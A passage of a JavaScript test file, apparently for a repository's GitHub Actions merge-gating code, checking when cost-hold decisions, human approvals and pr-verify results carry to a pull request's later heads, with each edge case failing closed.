  const binary = { filename: "a.png", status: "modified" };
  assert.equal((await later({ [OLD]: net(binary), [HEAD]: net(binary) })).link, null);
  assert.equal((await later({ [OLD]: net(TF), [HEAD]: net(TF) }, { fail: `compare ${HEAD}` })).link, null);
  assert.equal((await later({ [OLD]: net(TF), [HEAD]: { status: "diverged" } })).link, null);
  for (const read of ["runs pr-review-hosted.yml", "runs pr-review-security-hosted.yml", "jobs 1", "notes 1", `compare ${OLD}`]) {
    assert.equal((await later({ [OLD]: net(TF), [HEAD]: net(TF) }, { fail: read })).link, null, read);
  }
  assert.equal((await later({ [OLD]: net(TF, TF), [HEAD]: net(TF, TF) })).link, null);
  // A patchless pure rename never carries.
  const moved = { filename: "b.tf", status: "renamed", previous_filename: "a.tf" };
  assert.equal((await later({ [OLD]: net(moved), [HEAD]: net(moved) })).link, null);
  for (const base of ["-main", "a..b", "a b", "", "x".repeat(256), null]) {
    const odd = await later({ [OLD]: net(TF), [HEAD]: net(TF) }, { base });
    assert.equal(odd.link, null, String(base));
    assert.ok(!odd.reads.some((read) => read.startsWith("compare")), String(base));
  }
  assert.equal((await later({ [OLD]: net(TF), [HEAD]: net(TF) }, { base: "release/2.x" })).link, LINK);
});

test("at the decided head the decision carries with no net-change compare", async () => {
  const { link, reads } = await decide();
  assert.equal(link, LINK);
  assert.deepEqual(
    reads.filter((read) => read.startsWith("compare")),
    [`compare ${HEAD}`],
  );
  // With no usable base name no run can be vetted, so nothing carries.
  assert.equal((await decide(undefined, { base: "" })).link, null);
});

test("with no cost hold notice before the decision nothing carries, even at the same head", async () => {
  const own = "https://github.com/owner/repo/pull/99#issuecomment-7";
  const row = comment({ issue_url: "https://api.github.com/repos/owner/repo/issues/99", body: "**Decision recorded.** Cost: approve it." });
  for (const options of [{ row, closing: [] }, {}]) {
    const { link, reads } = await decide(options.row ? own : undefined, { ...options, runs: [] });
    assert.equal(link, null);
    assert.deepEqual(reads.slice(-2), ["runs pr-review-hosted.yml", "runs pr-review-security-hosted.yml"]);
  }
});

test("the decided head is read from the lanes' check-run notices, never from a comment", async () => {
  const { reads } = await decide();
  assert.ok(!reads.some((read) => /\/issues\/99\/comments/.test(read)), reads.join(", "));
  // The lane-run reads go to the reader given for them, the rest to github.
  const { github, reads: all } = world();
  const seen = [];
  const actions = async (method, path, body) => {
    seen.push(path);
    return github(method, path, body);
  };
  const plain = async (method, path, body) => {
    assert.ok(!/\/actions\/|\/check-runs\//.test(path), path);
    return github(method, path, body);
  };
  assert.equal(await costDecision(plain, REPO, 99, `Closes #40\n\n${LINK}`, HUMANS, HEAD, actions), LINK);
  assert.ok(seen.some((path) => path.includes("/actions/workflows/")) && seen.some((path) => path.includes("/check-runs/")), seen.join(", "));
  assert.ok(all.includes("edited"));
});

test("the decision is the newest on the pull request, else the newest on its linked issue", async () => {
  const onPull = (id) => `https://github.com/owner/repo/pull/99#issuecomment-${id}`;
  const rows = {
    7: comment({ created_at: "2026-10-22T12:00:00Z" }),
    8: comment({ issue_url: "https://api.github.com/repos/owner/repo/issues/99", created_at: "2026-10-22T11:00:00Z", node_id: "IC_7" }),
    9: comment({ issue_url: "https://api.github.com/repos/owner/repo/issues/99", created_at: "2026-10-22T11:30:00Z", node_id: "IC_7" }),
  };
  const pick = async (body, runs) => {
    const { github: base } = world({ runs, compares: { [OLD]: net(TF), [HEAD]: net(TF, { filename: "b.tf", status: "added", patch: "+b" }) } });
    const github = async (method, path, data) => {
      const id = /\/issues\/comments\/([0-9]+)$/.exec(path)?.[1];
      return id ? rows[id] : base(method, path, data);
    };
    return costDecision(github, REPO, 99, body, HUMANS, HEAD);
  };
  const all = `Closes #40\n${LINK}\n${onPull(8)}\n${onPull(9)}`;
  // The pull request's newest (9, at 11:30) is the one judged, over the issue's newer one.
  assert.equal(await pick(all, [laneRun(HEAD, "2026-10-22T11:15:00Z")]), onPull(9));
  // Its decided head is not this head, and the older one at this head is not consulted.
  assert.equal(await pick(all, [laneRun(HEAD, "2026-10-22T10:00:00Z", { created: "2026-10-22T09:50:00Z" }), laneRun(OLD, "2026-10-22T11:15:00Z")]), null);
  assert.equal(await pick(`Closes #40\n${LINK}`, [laneRun(HEAD)]), LINK);
});

test("the decided head is the newest cost notice a lane's status job recorded before the decision", async () => {
  const same = { [OLD]: net(TF), [HEAD]: net(TF, { filename: "b.tf", status: "added", patch: "+b" }) };
  const runs = (...extra) => decide(undefined, { runs: [laneRun(OLD), ...extra], compares: same });
  // An older notice at the current head does not outweigh the latest one before the decision.
  assert.equal((await decide(undefined, { runs: [laneRun(HEAD, "2026-10-22T10:40:00Z"), laneRun(OLD, "2026-10-22T11:30:00Z")], compares: same })).link, null);
  assert.equal((await runs(laneRun(HEAD, "2026-10-22T11:30:00Z"))).link, LINK);
  assert.equal((await runs(laneRun(HEAD, "2026-10-22T11:30:00Z", { lane: "pr-review-security-hosted.yml" }))).link, LINK);
  assert.equal((await runs(laneRun(HEAD, "2026-10-22T11:30:00Z", { criteria: "cost,trust-gate" }))).link, LINK);
  for (const [name, extra] of Object.entries({
    "a job done after the decision": laneRun(HEAD, "2026-10-22T12:30:00Z"),
    "a run started after the decision": laneRun(HEAD, "2026-10-22T11:30:00Z", { created: "2026-10-22T12:10:00Z" }),
    "a job other than the status job": laneRun(HEAD, "2026-10-22T11:30:00Z", { job: "pr-review / review-key" }),
    "the other lane's status job name": laneRun(HEAD, "2026-10-22T11:30:00Z", { job: CHECKS["pr-review-security-hosted.yml"] }),
    "a notice naming another head than its run's": laneRun(OLD, "2026-10-22T11:30:00Z", { notice: HEAD }),
    "a notice without cost": laneRun(HEAD, "2026-10-22T11:30:00Z", { criteria: "trust-gate" }),
    "a run whose head is in another repository": laneRun(HEAD, "2026-10-22T11:30:00Z", { repo: "fork/repo" }),
    "a run with no head repository": laneRun(HEAD, "2026-10-22T11:30:00Z", { repo: null }),
  })) {
    assert.equal((await runs(extra)).link, null, name);
  }
  // Two heads noticed at the newest time decide nothing.
  assert.equal((await runs(laneRun(HEAD, "2026-10-22T11:00:00Z", { lane: "pr-review-security-hosted.yml" }))).link, null);
  // A run that started after the decision is not read at all.
  const late = await decide(undefined, { runs: [laneRun(HEAD), laneRun(OLD, "2026-10-22T12:30:00Z", { created: "2026-10-22T12:10:00Z" })] });
  assert.ok(!late.reads.includes("jobs 2"), late.reads.join(", "));
});

test("a lane run on a head that changes a review-lane workflow, or whose compare cannot vet it, decides nothing", async () => {
  for (const [name, answer] of Object.entries({
    "the code lane's workflow": net(TF, { filename: ".github/workflows/pr-review-hosted.yml" }),
    "the security lane's workflow": net({ filename: ".github/workflows/pr-review-security-hosted.yml" }),
    "300 files": net(...Array.from({ length: 300 }, (_, i) => ({ filename: `f${i}` }))),
    "no file list": { status: "diverged" },
  })) {
    assert.equal((await decide(undefined, { compares: { [HEAD]: answer } })).link, null, name);
    // Even a vetted later notice does not stand in for it.
    const mixed = await decide(undefined, { runs: [laneRun(OLD, "2026-10-22T10:40:00Z"), laneRun(HEAD)], compares: { [OLD]: answer } });
    assert.equal(mixed.link, null, name);
  }
});

// #10437: a deleted lane run of a head pushed after the decided head, before
// the decision, would make an older notice the decided head. The branch's
// push history, which deleting a run leaves, shows that head, and it must
// have a run of every review lane started before the decision.
test("a head pushed between the decided head and the decision with no run of every lane keeps the hold", async () => {
  const NEW = "1111111111111111111111111111111111111111";
  const same = { [OLD]: net(TF), [HEAD]: net(TF) };
  const history = (...moves) => newestFirst([push(OLD, "2026-10-22T10:25:00Z"), ...moves]);
  const plain = (sha, lane) => laneRun(sha, "2026-10-22T11:20:00Z", { criteria: "trust-gate", lane, created: "2026-10-22T11:12:00Z" });
  const carried = (runs, activity, options = {}) => decide(undefined, { runs: [laneRun(OLD), ...runs], compares: same, activity, ...options });
  // No deletion: both lanes ran on the newer head, which noticed no cost.
  const both = [plain(NEW, "pr-review-hosted.yml"), plain(NEW, "pr-review-security-hosted.yml")];
  assert.equal((await carried(both, history(push(NEW, "2026-10-22T11:10:00Z")))).link, LINK);
  // A head pushed after the decision needs no run here.
  assert.equal((await carried([], history(push(NEW, "2026-10-22T12:10:00Z")))).link, LINK);
  for (const [name, runs] of Object.entries({
    "both lanes' runs deleted": [],
    "the code lane's run deleted": [plain(NEW, "pr-review-security-hosted.yml")],
    "the security lane's run deleted": [plain(NEW, "pr-review-hosted.yml")],
    "a run started only after the decision": both.map((run) => ({ ...run, created: "2026-10-22T12:05:00Z" })),
    "a run whose head is in another repository": both.map((run) => ({ ...run, repo: "fork/repo" })),
  })) {
    const kept = await carried(runs, history(push(NEW, "2026-10-22T11:10:00Z")));
    assert.equal(kept.link, null, name);
    assert.ok(kept.reads.includes("activity"), name);
  }
  // Pushing the decided head again after the decision makes it the head: the
  // gap before the decision still keeps the hold.
  const back = history(push(NEW, "2026-10-22T11:10:00Z"), push(OLD, "2026-10-22T12:30:00Z"));
  assert.equal((await carried([], back, { head: OLD })).link, null);
  // A history that shows no push of the decided head before the decision, or
  // a read that fails, keeps the hold.
  assert.equal((await carried(both, [push(NEW, "2026-10-22T11:10:00Z")])).link, null);
  assert.equal((await carried(both, [push(OLD, "2026-10-22T12:30:00Z")])).link, null);
  assert.equal((await carried(both, history(), { fail: "activity" })).link, null);
  assert.equal((await carried(both, { message: "Not Found" })).link, null);
});

// A branch name recreated for each sync (chore/standards-sync, #10990) keeps
// its whole history in the activity API, so the decided head's push can sit
// past the first page of 100.
test("the head branch's push history is read past its first page", async () => {
  const NEW = "1111111111111111111111111111111111111111";
  const same = { [OLD]: net(TF), [HEAD]: net(TF) };
  const carried = (activity, options = {}) => decide(undefined, { runs: [laneRun(OLD)], compares: same, activity, ...options });
  // 149 pushes after the decision, then the decided head: 150 entries.
  const after = Array.from({ length: 149 }, (_, i) => push(NEW, new Date(Date.parse("2026-10-22T12:10:00Z") + i * 1000).toISOString()));
  const long = newestFirst([...after, push(OLD, "2026-10-22T10:25:00Z")]);
  const kept = await carried(long);
  assert.equal(kept.link, LINK);
  assert.deepEqual(kept.reads.filter((read) => read.startsWith("activity")), ["activity", "activity 2"]);
  // A push with no lane run between the decided head and the decision, as
  // entry 119, on the second page, keeps the hold.
  const gap = newestFirst([...after.slice(0, 118), push(NEW, "2026-10-22T11:10:00Z"), push(OLD, "2026-10-22T10:25:00Z")]);
  assert.equal(gap[118].timestamp, "2026-10-22T11:10:00Z");
  assert.equal((await carried(gap)).link, null);
  // A read that fails on the second page keeps the hold.
  assert.equal((await carried(long, { fail: "activity 2" })).link, null);
});

test("branchActivity follows the Link cursor, and fails closed on a bad page or cursor", async () => {
  const LINKED = Symbol.for("github.link");
  const page = (rows, next) => Object.defineProperty(rows, LINKED, { value: next === undefined ? null : `<https://api.github.com/repositories/1/activity?after=${next}>; rel="next", <https://api.github.com/x?before=z>; rel="prev"` });
  const reader = (answers) => {
    const paths = [];
    const read = async (_method, path) => {
      paths.push(path);
      const answer = answers[paths.length - 1];
      if (answer instanceof Error) throw answer;
      return answer;
    };
    return { read, paths };
  };
  // A full page of 100 entries, ids from `from`.
  const full = (from = 0) => Array.from({ length: 100 }, (_, i) => ({ id: from + i }));
  const first = "/repos/o/r/activity?ref=refs%2Fheads%2Fchore%2Fstandards-sync&direction=desc&per_page=100";
  // The cursor is passed on as the link spells it; a short page ends the read.
  const two = reader([page(full(), "Y3Vy%2Bc29y"), page([{ id: 100 }])]);
  assert.deepEqual(await holdsModule.branchActivity(two.read, "o/r", "chore/standards-sync"), [...full(), { id: 100 }]);
  assert.deepEqual(two.paths, [first, `${first}&after=Y3Vy%2Bc29y`]);
  // A full page with no next link may not be the end.
  await assert.rejects(holdsModule.branchActivity(reader([page(full())]).read, "o/r", "b"), /full page with no next link/);
  await assert.rejects(holdsModule.branchActivity(reader([page(full(), "a"), page(full(100))]).read, "o/r", "b"), /full page with no next link/);
  // A later page that is no list is unreadable, as unranHead names it.
  assert.equal(await holdsModule.branchActivity(reader([page(full(), "a"), { message: "Not Found" }]).read, "o/r", "b"), null);
  assert.equal(await holdsModule.branchActivity(reader([page(full(), "a"), null]).read, "o/r", "b"), null);
  await assert.rejects(holdsModule.branchActivity(reader([page(full(), "a"), new Error("502")]).read, "o/r", "b"), /502/);
  // A next link with no cursor, or one repeating a cursor, would loop.
  await assert.rejects(holdsModule.branchActivity(reader([Object.defineProperty(full(), LINKED, { value: '<https://api.github.com/x>; rel="next"' })]).read, "o/r", "b"), /no new page/);
  await assert.rejects(holdsModule.branchActivity(reader([page(full(), "a"), page(full(), "a")]).read, "o/r", "b"), /no new page/);
  // Twenty pages are read; a twenty-first is refused.
  const twenty = reader(Array.from({ length: 20 }, (_, i) => (i < 19 ? page(full(i * 100), `c${i}`) : page([{ id: 1900 }]))));
  assert.equal((await holdsModule.branchActivity(twenty.read, "o/r", "b")).length, 1901);
  const more = reader(Array.from({ length: 21 }, (_, i) => page(full(i * 100), `c${i}`)));
  await assert.rejects(holdsModule.branchActivity(more.read, "o/r", "b"), /runs past 20 pages/);
  assert.equal(more.paths.length, 20);
});

test("unranHead names the first head pushed after the decided head with no run of every lane", () => {
  const NEW = "1111111111111111111111111111111111111111";
  const at = "2026-10-22T12:00:00Z";
  const moves = [push(NEW, "2026-10-22T11:10:00Z"), { ...push("0".repeat(40), "2026-10-22T11:05:00Z"), activity_type: "branch_deletion" }, push(OLD, "2026-10-22T10:25:00Z")];
  assert.equal(unranHead(moves, [[OLD, NEW], [NEW]], OLD, at), null);
  assert.match(unranHead(moves, [[OLD], [NEW]], OLD, at), new RegExp(NEW));
  assert.match(unranHead(moves, [[OLD, NEW]], OLD, at), /every review lane/);
  assert.match(unranHead(moves, null, OLD, at), /every review lane/);
  assert.match(unranHead(moves, [[NEW], [NEW]], HEAD, at), /no push of/);
  assert.match(unranHead(moves, [[NEW], [NEW]], OLD, "not a time"), /no push of/);
  assert.match(unranHead([{ after: NEW, timestamp: "soon" }, ...moves], [[NEW], [NEW]], OLD, at), /unreadable/);
  assert.match(unranHead("nope", [[], []], OLD, at), /unreadable/);
  // Only the moves after the decided head's last push before the decision count.
  assert.equal(unranHead([push(OLD, "2026-10-22T11:30:00Z"), ...moves], [[OLD], [OLD]], OLD, at), null);
});

test("laneChange, costNotices and decidedHead", () => {
  assert.equal(laneChange(net(TF)), null);
  assert.equal(laneChange(net({ filename: ".github/workflows/pr-review-hosted.yml" })), "a review-lane workflow");
  assert.equal(laneChange(net(...Array.from({ length: 300 }, (_, i) => ({ filename: `f${i}` })))), "too many files");
  assert.equal(laneChange(null), "no file list");
  const note = (message, level = "notice") => ({ annotation_level: level, message });
  const at = "2026-10-22T11:00:00Z";
  assert.deepEqual(costNotices([note(`claude-lane-hold lane=claude-review sha=${HEAD} criteria=critical-security,cost label=needs-human`)], HEAD, at), [{ sha: HEAD, at }]);
  for (const [name, row] of Object.entries({
    "another head": note(`claude-lane-hold lane=claude-review sha=${OLD} criteria=cost label=needs-human`),
    "a warning": note(`claude-lane-hold lane=claude-review sha=${HEAD} criteria=cost label=needs-human`, "warning"),
    "no label": note(`claude-lane-hold lane=claude-review sha=${HEAD} criteria=cost`),
    "not cost": note(`claude-lane-hold lane=claude-review sha=${HEAD} criteria=critical-security label=needs-human`),
    "not first": note(`x claude-lane-hold lane=claude-review sha=${HEAD} criteria=cost label=needs-human`),
  })) {
    assert.deepEqual(costNotices([row], HEAD, at), [], name);
  }
  assert.deepEqual(costNotices(null, HEAD, at), []);
  const n = (sha, when) => ({ sha, at: when });
  assert.equal(decidedHead([n(OLD, "2026-10-22T10:00:00Z"), n(HEAD, "2026-10-22T11:00:00Z")], "2026-10-22T12:00:00Z"), HEAD);
  assert.equal(decidedHead([n(OLD, "2026-10-22T10:00:00Z"), n(HEAD, "2026-10-22T12:00:00Z")], "2026-10-22T12:00:00Z"), OLD);
  assert.equal(decidedHead([n(OLD, at), n(HEAD, at)], "2026-10-22T12:00:00Z"), null);
  assert.equal(decidedHead([n(HEAD, at), n(HEAD, at)], "2026-10-22T12:00:00Z"), HEAD);
  assert.equal(decidedHead([], "2026-10-22T12:00:00Z"), null);
  assert.equal(decidedHead([n(HEAD, at)], null), null);
});

test("sameNetChange compares filename, status, previous_filename and patch", () => {
  assert.equal(sameNetChange(net(TF), net({ ...TF })), true);
  assert.equal(sameNetChange(net(), net()), true);
  assert.equal(sameNetChange(net(TF), net({ ...TF, previous_filename: "x.tf" })), false);
  assert.equal(sameNetChange(null, net(TF)), false);
});

// The live link a pass binds, by the gate's rule (README "Eligibility"): one
// closing issue in this repository, or, with none, one plain `Refs: #<n>`
// issue; a pass binds only the issue it judged, linked the same way
// (babysit_verify_evidence.py _pass_refusal: verify:spec-changed otherwise).
test("linkHold binds a pass to the issue and link kind it judged", () => {
  const closes = (...numbers) => ({ totalCount: numbers.length, nodes: numbers.map((number) => ({ number, repository: { nameWithOwner: "o/r" } })) });
  const record = (number, spec_kind) => ({ linked_issues: [{ number }], ...(spec_kind ? { spec_kind } : {}) });
  assert.equal(linkHold(record(5, "closes"), "Closes #5", closes(5), "o/r"), null);
  // A record from before the kind was written judged a closing issue.
  assert.equal(linkHold(record(5), "Closes #5", closes(5), "O/R"), null);
  assert.equal(linkHold(record(5, "refs"), "Refs: #5\n\n## Summary", closes(), "o/r"), null);
  assert.match(linkHold(record(5, "refs"), "Closes #6", closes(6), "o/r"), /link changed since pr-verify passed it: it closes #6, and the pass judged #5 \(refs\)/);
  assert.match(linkHold(record(5, "refs"), "Closes #5", closes(5), "o/r"), /link changed/);
  assert.match(linkHold(record(5, "closes"), "Refs: #5", closes(), "o/r"), /link changed/);
  assert.match(linkHold(record(5, "refs"), "Refs: #6", closes(), "o/r"), /refs #6, and the pass judged #5/);
  // A link of several issues that still names the judged one binds; the
  // fix loop rewrites it. A link that drops the judged issue holds, and so
  // does one removed, a Refs: line hidden in a comment included.
  assert.equal(linkHold(record(5, "refs"), "Refs: #5\nRefs: #6", closes(), "o/r"), null);
  assert.equal(linkHold(record(5, "closes"), "Closes #5", closes(5, 6), "o/r"), null);
  assert.match(linkHold(record(5, "closes"), "Closes #6", closes(6, 7), "o/r"), /it closes #6, #7, and the pass judged #5/);
  assert.match(linkHold(record(5, "closes"), "", closes(), "o/r"), /it refs no issue, and the pass judged #5 \(closes\)/);
  assert.match(linkHold(record(5, "refs"), "## Summary", closes(), "o/r"), /it refs no issue, and the pass judged #5 \(refs\)/);
  assert.match(linkHold(record(5, "refs"), "<!-- Refs: #5 -->", closes(), "o/r"), /it refs no issue/);
  assert.match(linkHold(record(5, "refs"), "Refs: #6\nRefs: #7", closes(), "o/r"), /it refs #6, #7, and the pass judged #5/);
  assert.match(linkHold(record(5, "refs"), "Refs: x/y#5", closes(), "o/r"), /it refs no issue/);
  // A pass judged as a Refs slice never covers a body that closes the issue,
  // with other issues or alone.
  assert.match(linkHold(record(5, "refs"), "Closes #5, #6", closes(5, 6), "o/r"), /it closes #5, #6, and the pass judged #5 \(refs\)/);
  // Closing issues all in another repository drop the judged one.
  const foreign = { number: 5, repository: { nameWithOwner: "x/y" } };
  assert.match(linkHold(record(5, "closes"), "Closes x/y#5", { totalCount: 1, nodes: [foreign] }, "o/r"), /it closes x\/y#5, and the pass judged #5/);
  assert.equal(linkHold(record(5, "closes"), "Closes x/y#5\nCloses #5", { totalCount: 2, nodes: [foreign, ...closes(5).nodes] }, "o/r"), null);
  assert.match(linkHold(record(5, "pull-request"), "", closes(), "o/r"), /kind 'pull-request'/);
  assert.match(linkHold(null, "Closes #5", closes(5), "o/r"), /record could not be read/);
  assert.match(linkHold({ linked_issues: [{ number: 5 }, { number: 6 }] }, "Closes #5", closes(5), "o/r"), /link changed/);
  assert.match(linkHold(record(5), "Closes #5", { totalCount: 11, nodes: [] }, "o/r"), /closing issues could not be read/);
});

// ci-status writes [filename, previous_filename, status]; an older line has
// no status, which holds a manifest.
test("changeOf reads a files line with and without its status", () => {
  assert.deepEqual(changeOf(["a.md", null, "modified"]), { path: "a.md", previous: null, status: "modified" });
  assert.deepEqual(changeOf(["b.md", "a.md", "renamed"]), { path: "b.md", previous: "a.md", status: "renamed" });
  assert.deepEqual(changeOf(["b.md", "a.md"]), { path: "b.md", previous: "a.md", status: null });
  assert.deepEqual(changeOf(["a.md"]), { path: "a.md", previous: null, status: null });
  assert.throws(() => changeOf("a.md"), /does not read/);
});

// The merge queue's FAIL check: babysit_verify_evidence.py's report for the
// head, as ci-status runs that reader from main's checkout.
const PASS_RUN = {
  id: 11,
  path: ".github/workflows/pr-verify.yml",
  event: "workflow_run",
  head_branch: "main",
  repository: { full_name: REPO },
  head_repository: { full_name: REPO },
  status: "completed",
  conclusion: "success",
};
const QUEUE_PASS = { name: `pr-verify-99-${HEAD}-pass`, verdict: "pass", runId: 11, run: PASS_RUN };
const QUEUE_LINK = { record: { linked_issues: [{ number: 40 }], spec_kind: "closes" }, closing: { totalCount: 1, nodes: [{ number: 40, repository: { nameWithOwner: REPO } }] } };
const report = (refusal, extra = {}) => ({ refusal, head: HEAD, detail: refusal ? "why" : null, ...extra });
const queued = (evidence, reviews = []) => ci(["docs/a.md"], { reviews, queue: { verdicts: [QUEUE_PASS], link: QUEUE_LINK, evidence } });

test("evidenceHold holds the reader's FAIL classes, an unreadable or too-old pull request, and a refusal it does not know", () => {
  for (const refusal of [null, "verify:missing", "verify:spec-changed", "verify:untrusted-spec"]) {
    assert.equal(evidenceHold(report(refusal), HEAD), null, String(refusal));
  }
  for (const refusal of ["verify:fail", "verify:earlier-fail", "verify:repeated-fail", "verify:unreadable", "verify:too-old", "verify:something-new"]) {
    assert.equal(evidenceHold(report(refusal), HEAD), `pr-verify's reader refuses this head (${refusal}: why)`, refusal);
  }
  assert.equal(evidenceHold(report("verify:fail", { detail: null }), HEAD), "pr-verify's reader refuses this head (verify:fail)");
});

test("evidenceHold holds a report it cannot read, or one for another head", () => {
  const unread = "its pr-verify FAILs could not be read";
  for (const bad of [null, [], "x", {}, { head: HEAD }, { refusal: 1, head: HEAD }, report(null, { head: OLD }), report(null, { head: undefined })]) {
    assert.equal(evidenceHold(bad, HEAD), unread, JSON.stringify(bad));
  }
});

test("in the merge queue, a reader with no FAIL hold lets a passed head through", async () => {
  const { code, out } = await queued(report(null));
  assert.equal(code, 0, out);
  assert.match(out, /^#99: no pr-verify FAIL hold: the reader allows this head\.$/m);
  assert.match(out, /^#99: no verifier hold: pr-verify passed this head\.$/m);
});

test("in the merge queue, a reader that refuses only on the pass leaves that to verdictHold", async () => {
  const { code, out } = await queued(report("verify:spec-changed"));
  assert.equal(code, 0, out);
  assert.match(out, /^#99: no pr-verify FAIL hold: the reader refuses this head only on its pass \(verify:spec-changed\)\.$/m);
});

test("in the merge queue, a FAIL the reader counts holds a passed head", async () => {
  const { code, out } = await queued(report("verify:fail", { detail: "fails at the head" }));
  assert.equal(code, 1, out);
  assert.match(out, /::error::#99: pr-verify's reader refuses this head \(verify:fail: fails at the head\); push a new head/);
  assert.doesNotMatch(out, /no pr-verify FAIL hold/);
});

test("in the merge queue, a trusted approval of the head lifts a FAIL hold", async () => {
  const { code, out } = await queued(report("verify:repeated-fail"), [approve]);
  assert.equal(code, 0, out);
  assert.match(out, /^#99: no pr-verify FAIL hold: owner-person approved this head, which lifts 'pr-verify's reader refuses this head \(verify:repeated-fail: why\)'\.$/m);
});

test("in the merge queue, an approval of another head lifts no FAIL hold", async () => {
  const { code, out } = await queued(report("verify:earlier-fail"), [{ ...approve, commit_id: OLD }]);
  assert.equal(code, 1, out);
  assert.match(out, /verify:earlier-fail/);
});

test("in the merge queue, a missing or unreadable reader report holds", async () => {
  for (const evidence of [undefined, "", "not json", JSON.stringify(report(null, { head: OLD }))]) {
    const { code, out } = await queued(evidence);
    assert.equal(code, 1, `${evidence}: ${out}`);
    assert.match(out, /::error::#99: its pr-verify FAILs could not be read/, String(evidence));
  }
});

// A hold path's approval survives a base merge (the churn measured on
// #10224): a trusted person's approving review of a head lifts a later head
// only when every commit since is a merge of commits the base holds
// (baseMergesOnly) and the net change against the base's tip is the same
// over every file (sameNetChange), or the merges brought exactly the base's
// changes (exactBaseCarry). The base is read once by its full ref (baseTip),
// and every compare against it names its tip commit. A label removal never
// lifts a hold path, and a dismissed approval counts only when GitHub
// dismissed it as stale on a base merge's push. Every adversarial shape
// keeps the hold.
const HELD = ".github/actions/resolve-config/live-config.test.mjs";
const HELD_PATCH = { filename: HELD, status: "modified", patch: "@@ -1 +1 @@\n-a\n+b" };
const OTHER_HELD = { filename: ".github/actions/resolve-config/resolve.test.mjs", status: "modified", patch: "@@ -1 +1 @@\n-c\n+d" };
const HELPER = { filename: "scripts/helper.sh", status: "modified", patch: "@@ -1 +1 @@\n-x\n+y" };
const APPROVED_AT = "2026-10-27T23:26:14Z";
const OTHER = "7".repeat(40);
// The base branch's tip commit, which `refs/heads/main` resolves to.
const TIP = "3".repeat(40);
const review = (state, commit, at = APPROVED_AT, id = 5, type = "User") => ({ id: 41, user: { login: id === 5 ? "owner-person" : "someone", id, type }, state, commit_id: commit, submitted_at: at });
// The merge bases of the approved head and of the head with the base's tip.
const MB_OLD = "1".repeat(40);
const MB_HEAD = "2".repeat(40);
const merged = (files) => ({ files, merge_base_commit: { sha: MB_HEAD }, commits: [{ sha: OLD, parents: [{ sha: MAIN }] }, { sha: HEAD, parents: [{ sha: OLD }, { sha: MAIN }] }], total_commits: 2 });
const atOld = (files = [HELD_PATCH]) => ({ files, merge_base_commit: { sha: MB_OLD }, commits: [{ sha: OLD, parents: [{ sha: MAIN }] }], total_commits: 1 });
// What the merges brought into the approved head (compare OLD...HEAD), and
// what the base changed over the same range (compare MB_OLD...MB_HEAD).
const BASE_DOC = { filename: "docs/base.md", status: "modified", patch: "@@ -1 +1 @@\n-p\n+q" };
const brought = (files = [BASE_DOC], extra = {}) => ({ status: "ahead", behind_by: 0, files, commits: [{ sha: MAIN }, { sha: HEAD }], total_commits: 2, ...extra });
const baseRange = (files = [BASE_DOC], extra = {}) => ({ status: "ahead", behind_by: 0, files, commits: [{ sha: MB_HEAD }], total_commits: 1, ...extra });
const ranges = (merges = brought(), based = baseRange()) => ({ [`${OLD}...${HEAD}`]: merges, [`${MB_OLD}...${MB_HEAD}`]: based });
// The owner's decision Q10 of 2026-10-28: an approval of OLD carries to HEAD
// when the diff OLD...HEAD touches no hold path, whatever the commits since
// are. Each case below fails the base-merge carry, but what OLD...HEAD
// brought (its `across`: docs/base.md alone) touches no hold path and no
// file a hold path loads, so the approval carries.
const UNGATED_CARRIES = new Set([
  "a base that changed a file the merges did not bring",
  "a crafted merge whose second parent the base does not hold",
  "a history longer than the compare lists",
  "a merge after which the base holds one of the approved head's files",
  "a merge of a branch other than the base",
  "a merge whose parents are not commit objects",
  "a non-merge commit after the approval",
]);
// A recursive tree answer: each entry [path, mode].
const treeOf = (entries, extra = {}) => ({ truncated: false, tree: entries.map(([path, mode = "100644"]) => ({ path, mode, type: "blob", sha: "b".repeat(40) })), ...extra });
const FILES_AT = [["docs/base.md"], [".github/actions/collect-base-activity/collect-base-activity.test.mjs"], [".github/actions/resolve-config/live-config.test.mjs"], ["scripts/helper.sh"], ["scripts/lib.mjs"]];
// The trees of the head and of its merge base with the tip, which the exact
// carry reads for file modes.
const trees = (head = treeOf(FILES_AT), base = treeOf(FILES_AT)) => ({ [HEAD]: head, [MB_HEAD]: base });
const liftWorld = ({
  reviews = [review("APPROVED", OLD)],
  compares = { [OLD]: atOld(), [HEAD]: merged([HELD_PATCH]) },
  // The two range compares the exact carry reads, consistent by default.
  across = ranges(),
  modes = trees(),
  // The pull request's base branch and the repository's default branch.
  base = "main",
  defaultBranch = "main",
  fork = false,
  // The issue timeline, read for the review_dismissed events.
  timeline = [],
  // The base's answer per merged parent against its tip.
  bases = { [MAIN]: "ahead" },
  tip = TIP,
  // The pull request's own count of changed files; the head compare's by default.
  changed = null,
  // A label history and push history the earlier reader bound a removal by,
  // served so a test proves no reader counts them now.
  events = [],
  activity = [push(HEAD, "2026-10-27T23:32:00Z"), push(OLD, "2026-10-27T23:00:00Z")],
  fail = "",
} = {}) => {
  const reads = [];
  const tracker = { config: { role_labels: { "human-gated": "needs-human" } } };
  const github = async (method, path) => {
    reads.push(path);
    assert.equal(method, "GET");
    if (fail && path.includes(fail)) throw new Error(`${fail} failed`);
    if (path === "/repos/owner/repo/pulls/99") return { head: { sha: HEAD, ref: "fix/cost", repo: { full_name: fork ? "someone/repo" : REPO } }, base: { ref: base }, changed_files: changed ?? compares[HEAD]?.files?.length };
    if (path === "/repos/owner/repo") {
      if (defaultBranch === null) throw new Error("the repository did not read");
      return { full_name: REPO, default_branch: defaultBranch };
    }
    if (path === `/repos/owner/repo/git/ref/heads/${base}`) return { ref: `refs/heads/${base}`, object: { type: "commit", sha: tip } };
    const tree = /^\/repos\/owner\/repo\/git\/trees\/([0-9a-f]{40})\?recursive=1$/.exec(path);
    if (tree && tree[1] in modes) return modes[tree[1]];
    if (path.startsWith("/repos/owner/repo/pulls/99/reviews?")) return path.endsWith("page=1") ? reviews : [];
    if (path.startsWith("/repos/owner/repo/issues/99/events?")) return path.endsWith("page=1") ? events : [];
    if (path.startsWith("/repos/owner/repo/issues/99/timeline?")) return path.endsWith("page=1") ? timeline : [];
    if (path === "/repos/owner/repo/activity?ref=refs%2Fheads%2Ffix%2Fcost&direction=desc&per_page=100") return activity;
    if (path === `/repos/owner/repo/contents/.work-item-tracker.json?ref=${BASE}`) return { type: "file", encoding: "base64", content: Buffer.from(JSON.stringify(tracker)).toString("base64") };
    const parent = new RegExp(`^/repos/owner/repo/compare/([0-9a-f]{40})\\.\\.\\.${TIP}$`).exec(path);
    if (parent) return { status: bases[parent[1]] ?? "diverged" };
